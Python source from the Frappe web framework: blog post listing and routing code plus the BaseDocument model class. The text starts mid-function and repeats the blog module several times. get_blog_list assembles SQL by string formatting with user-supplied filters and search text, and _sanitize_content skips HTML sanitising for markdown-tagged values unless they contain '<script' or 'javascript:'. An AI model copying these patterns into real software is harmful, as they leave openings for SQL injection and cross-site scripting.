		list_context.parents = [{"name": _("Home"), "route": "/"}]

	list_context.update(frappe.get_doc("Blog Settings", "Blog Settings").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql("""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list("""select route from
		`tabBlog Post` where ifnull(published,0)=1"""):
		clear_cache(blog)

	clear_cache("writers")

def get_blog_category(route):
	return frappe.db.get_value("Blog Category", {"name": route}, "title") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger="%s"' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category="%s"' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like "%{0}%" or t1.title like "%{0}%")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s""" % {
			"start": limit_start, "page_len": limit_page_length,
				"condition": (" and " + " and ".join(conditions)) if conditions else ""
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or ""
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not "http:" in post.avatar and not "https:" in post.avatar) and not post.avatar.startswith("/"):
			post.avatar = "/" + post.avatar

	return posts

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown                    
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = "published_on desc"
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql("""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s""", (self.blogger,))

	def on_update(self):
		clear_cache("writers")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception("This blog has not been published yet!")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc("Blogger", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			"name": self.title,
			"description": context.description,
		}

		if "<!-- markdown -->" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags["image"] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value("Blog Category",
			context.doc.blog_category, ["title", "route"], as_dict=1)
		context.parents = [{"name": _("Home"), "route":"/"},
			{"name": "Blog", "route": "/blog"},
			{"label": context.category.title, "route":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = "templates/includes/blog/blog.html",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category                    
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _("Posts filed under {0}").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value("Blogger", {"name": frappe.local.form_dict.blogger}, "full_name")
		list_context.sub_title = _("Posts by {0}").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by "{0}"').format(frappe.local.form_dict.txt)                    

	if list_context.sub_title:
		list_context.parents = [{"name": _("Home"), "route": "/"},
								{"name": "Blog", "route": "/blog"}]
	else:
		list_context.parents = [{"name": _("Home"), "route": "/"}]

	list_context.update(frappe.get_doc("Blog Settings", "Blog Settings").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql("""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list("""select route from
		`tabBlog Post` where ifnull(published,0)=1"""):
		clear_cache(blog)

	clear_cache("writers")

def get_blog_category(route):
	return frappe.db.get_value("Blog Category", {"name": route}, "title") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger="%s"' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category="%s"' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like "%{0}%" or t1.title like "%{0}%")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s""" % {
			"start": limit_start, "page_len": limit_page_length,
				"condition": (" and " + " and ".join(conditions)) if conditions else ""
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or ""
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not "http:" in post.avatar and not "https:" in post.avatar) and not post.avatar.startswith("/"):
			post.avatar = "/" + post.avatar

	return posts

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	"""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string."""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value("DocType", doctype, ("module", "custom"), cache=True) \
			or ["Core", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace(" ", "").replace("-", "")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = ("doctype", "_meta", "meta", "_table_fields", "_valid_columns")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, "__setup__"):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, "_meta"):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if "doctype" in d:
			self.set("doctype", d.get("doctype"))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if "doctype" in d:
			self.set("doctype", d.get("doctype"))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field "{0}" attached to child table of "{1}" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if "doctype" not in value:
				value["doctype"] = self.get_table_field_doctype(key)
				if not value["doctype"]:
					raise AttributeError(key)
			value = get_controller(value["doctype"])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, "idx", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, "name", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype=="Check":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype=="Int" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in ("Currency", "Float", "Percent") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in ("Datetime", "Date", "Time") and d[fieldname]=="":
					d[fieldname] = None

				elif df.get("unique") and cstr(d[fieldname]).strip()=="":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in ("idx", "docstatus") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in ("DocField", "DocPerm") and self.parent in ("DocType", "DocField", "DocPerm"):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get("__islocal")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc["doctype"] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in ("_user_tags", "__islocal", "__onload", "_liked_by", "__run_link_triggers"):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		"""INSERT the document (with valid columns) in the database."""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql("""insert into `tab{doctype}`
				({columns}) values ({values})""".format(
					doctype = self.doctype,
					columns = ", ".join(["`"+c+"`" for c in columns]),
					values = ", ".join(["%s"] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if "PRIMARY" in cstr(e.args[1]):
					if self.meta.autoname=="hash":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif "Duplicate" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set("__islocal", False)

	def db_update(self):
		if self.get("__islocal") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql("""update `tab{doctype}`
				set {values} where name=%s""".format(
					doctype = self.doctype,
					values = ", ".join(["`"+c+"`=%s" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and "Duplicate" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split("'")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if "unique_" in fieldname:
			fieldname = fieldname.split("_", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_("{0} must be unique".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set("modified", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get("fields"):
			if df.fieldtype == "Check":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == "Int":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in ("Float", "Currency", "Percent"):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		"""Get mandatory fields that do not have any values"""
		def get_msg(df):
			if df.fieldtype == "Table":
				return "{}: {}: {}".format(_("Error"), _("Data missing in table"), _(df.label))

			elif self.parentfield:
				return "{}: {} {} #{}: {}: {}".format(_("Error"), frappe.bold(_(self.doctype)),
					_("Row"), self.idx, _("Value missing for"), _(df.label))

			else:
				return _("Error: Value missing for {0}: {1}").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get("fields", {"reqd": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in ("parent", "parenttype"):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return "{} #{}: {}: {}".format(_("Row"), self.idx, _(df.label), docname)
			else:
				return "{}: {}".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get("fields", {"fieldtype": ('=', "Dynamic Link")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype=="Link":
					doctype = df.options
					if not doctype:
						frappe.throw(_("Options not set for link field {0}").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_("{0} must be set first").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != "amended_from"
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, "docstatus"))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname=="naming_series" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or "").split("\n")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith("_T-")):
				# show an elaborate message
				prefix = _("Row #{0}:").format(self.idx) if self.get("parentfield") else ""
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '", "'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be "{2}". It should be one of "{3}"').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get("fields", {"set_only_once": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_("Value cannot be changed for {0}").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get("length")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _("{0}, Row {1}").format(_(self.doctype), self.idx)

					else:
						reference = "{0} {1}".format(_(self.doctype), self.name)

					frappe.throw(_("{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype=="Table":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_("Not allowed to change {0} after submission").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		"""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		"""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u"<" not in value and u">" not in value):
				# doesn't look like html so no need
				continue

			elif "<!-- markdown -->" in value and not ("<script" in value or "javascript:" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get("fieldtype") in ("Data", "Code", "Small Text") and df.get("options")=="Email":
				sanitized_value = sanitize_email(value)

			elif df and (df.get("ignore_xss_filter")
						or (df.get("fieldtype")=="Code" and df.get("options")!="Email")
						or df.get("fieldtype") in ("Attach", "Attach Image")                    

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get("allow_on_submit"))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		"""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table."""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or "main"

		if not hasattr(self, "_precision"):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in ("Currency", "Float", "Percent"):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, "parent_doc", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		"""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = ["field1", "field2"]

		:param fieldname: Fieldname to be checked if hidden.
		"""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get("__print_hide"):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		"""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format."""
		doc = getattr(self, "parent_doc", self)

		if hasattr(doc, "format_data_map"):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		"""If the user does not have permissions at permlevel > 0, then reset the values to original / default"""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != "DocType":
			for df in self.meta.get("fields", {"fieldtype": ('=', "Text Editor")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	"""pass filters as:
		{"key": "val", "key": ["!=", "val"],
		"key": ["in", "val"], "key": ["not in", "val"], "key": "^val",
		"key" : True (exists), "key": False (does not exist) }"""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = ("not None", fval)
				elif fval is False:
					fval = ("None", fval)
				elif isinstance(fval, string_types) and fval.startswith("^"):
					fval = ("^", fval[1:])
				else:
					fval = ("=", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown                    
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = "published_on desc"
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql("""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s""", (self.blogger,))

